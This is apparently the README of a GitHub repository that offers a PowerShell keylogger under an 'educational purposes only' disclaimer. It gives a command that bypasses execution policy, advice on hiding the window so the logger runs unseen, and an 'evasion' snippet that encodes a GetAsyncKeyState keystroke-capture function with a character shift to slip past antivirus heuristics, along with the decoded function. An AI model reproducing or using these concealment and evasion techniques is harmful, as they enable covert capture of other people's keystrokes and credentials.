# Powershell_Keylogger
THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY

MALICIOUS USE OF THIS TOOL MAY CONSTITUTE A CRIME


![image](https://github.com/user-attachments/assets/512bdf4c-6e45-4d60-b867-6433ae9cd6b0)
[VirusTotal Report](https://www.virustotal.com/gui/file/5eea445524cc3ce4f703ff86436e4cd513c558e50feb887f2a0b26ca38eca845/detection)

# Running Tool

Often times windows powershell prevents running scripts due to execution policy, this can be avoided by using the following syntax

```
powershell.exe -ExecutionPolicy Bypass -File keylogger.ps1
```
This command does not require elevated permissions

To run this in the background append the `-windowstyle hidden` argument to the previous command

# Heuristic Evasion

```
$KeyStateFunction = ""
(109, 124, 117, 106, 123, 112, 118, 117, 39, 78, 108, 123, 82, 108, 128, 90, 123, 104, 123, 108, 39, 47, 43, 114, 108, 128, 51, 39, 43, 116, 104, 122, 114, 39, 68, 39, 55, 127, 62, 77, 77, 77, 48, 39, 130, 39, 121, 108, 123, 124, 121, 117, 39, 98, 105, 118, 118, 115, 100, 47, 47, 98, 87, 122, 86, 117, 108, 72, 119, 112, 53, 82, 108, 128, 105, 118, 104, 121, 107, 100, 65, 65, 78, 108, 123, 72, 122, 128, 117, 106, 82, 108, 128, 90, 123, 104, 123, 108, 47, 98, 105, 128, 123, 108, 100, 43, 114, 108, 128, 48, 48, 39, 52, 105, 104, 117, 107, 39, 43, 116, 104, 122, 114, 48, 39, 132) | ForEach-Object {
	$KeyStateFunction += [char]($_ - 7)
}
```

The full function is:

```
function GetKeyState ($key, $mask = 0x7FFF) { 
    return [bool](([PsOneApi.Keyboard]::GetAsyncKeyState([byte]$key)) -band $mask) 
}
```
